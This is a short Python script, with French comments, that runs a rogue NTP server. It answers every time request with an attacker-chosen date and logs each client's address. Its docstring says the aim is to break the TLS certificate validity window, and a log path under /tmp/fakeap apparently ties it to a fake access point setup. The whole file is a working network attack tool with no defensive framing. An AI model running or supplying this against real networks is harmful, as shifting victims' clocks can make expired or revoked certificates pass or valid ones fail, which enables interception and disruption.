#!/usr/bin/env python3
"""Serveur NTP qui sert une DATE CHOISIE (pour casser la fenêtre de validite TLS)."""
import argparse, socket, struct, time, datetime

def ntp_ts(t):
    sec = int(t) + 2208988800
    frac = int((t - int(t)) * (1 << 32)) & 0xFFFFFFFF
    return struct.pack("!II", sec & 0xFFFFFFFF, frac)

ap = argparse.ArgumentParser()
ap.add_argument("--date", required=True, help="ex: 2030-01-01 ou 2020-06-15")
ap.add_argument("--log", default="/tmp/fakeap/ntp_shift.log")
a = ap.parse_args()
fake = datetime.datetime.strptime(a.date, "%Y-%m-%d").replace(tzinfo=datetime.timezone.utc).timestamp()
logf = open(a.log, "a", buffering=1)
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 123))
print(f"[ntp_shift] date servie = {a.date} (epoch {int(fake)})", flush=True)
while True:
    data, addr = s.recvfrom(1024)
    if len(data) < 48:
        continue
    resp = bytearray(48)
    resp[0] = 0x24; resp[1] = 2; resp[2] = 4; resp[3] = 0xEC
    resp[4:8] = struct.pack("!I", 1 << 16)
    resp[8:12] = struct.pack("!I", 1 << 16)
    resp[12:16] = b"LOCL"
    resp[16:24] = ntp_ts(fake)     # reference
    resp[24:32] = data[40:48]      # originate = client tx
    resp[32:40] = ntp_ts(fake)     # receive
    resp[40:48] = ntp_ts(fake)     # transmit
    s.sendto(bytes(resp), addr)
    logf.write(f"{time.strftime('%H:%M:%S')} {addr[0]}:{addr[1]} -> {a.date}\n")
